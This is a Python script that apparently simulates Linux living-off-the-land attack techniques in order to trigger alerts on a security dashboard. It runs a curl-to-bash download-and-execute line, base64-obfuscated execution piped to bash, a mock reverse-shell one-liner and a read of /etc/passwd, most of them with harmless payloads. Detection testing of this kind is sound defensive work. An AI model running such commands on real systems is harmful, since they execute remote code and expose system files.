import subprocess
import base64
import os
import time

def print_banner():
    print("=" * 45)
    print("   LOTL Attack Simulation Started (Linux)")
    print("=" * 45)

def run_cmd(name, explanation, command):
    print(f"\n[METHOD] {name}")
    print(f"Explanation: {explanation}")
    print(f"Running: {command}")
    try:
        # We use shell=True to simulate how an attacker might run these
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        print("✅ Command executed.")
    except Exception as e:
        print(f"❌ Failed: {e}")

def main():
    print_banner()

    # 1. Simulate Curl Pipe to Bash (Common for malware installation)
    run_cmd(
        "Curl Abuse",
        "Attackers use 'curl' to download and execute scripts directly in memory.",
        "curl -s http://example.com/installer.sh | bash"
    )

    # 2. Simulate Base64 Obfuscation
    encoded = base64.b64encode(b"echo 'Malicious alert triggered!'").decode()
    run_cmd(
        "Base64 Obfuscation",
        "Encoding commands in Base64 is used to bypass simple keyword filters.",
        f"echo {encoded} | base64 -d | bash"
    )

    # 3. Simulate Reverse Shell One-Liner (Harmless demo)
    run_cmd(
        "Python Execution",
        "One-liners in Python or Perl are often used to establish reverse shells.",
        "python3 -c \"print('Establishing connection to C2 server...')\""
    )

    # 4. Simulate Sensitive File Access
    run_cmd(
        "Credential Hunting",
        "Searching for sensitive files like /etc/shadow or configs.",
        "cat /etc/passwd | grep root"
    )

    print("\n" + "=" * 45)
    print("All simulations completed!")
    print("Check your SOCflow Dashboard for new alerts.")
    print("=" * 45)

if __name__ == "__main__":
    main()
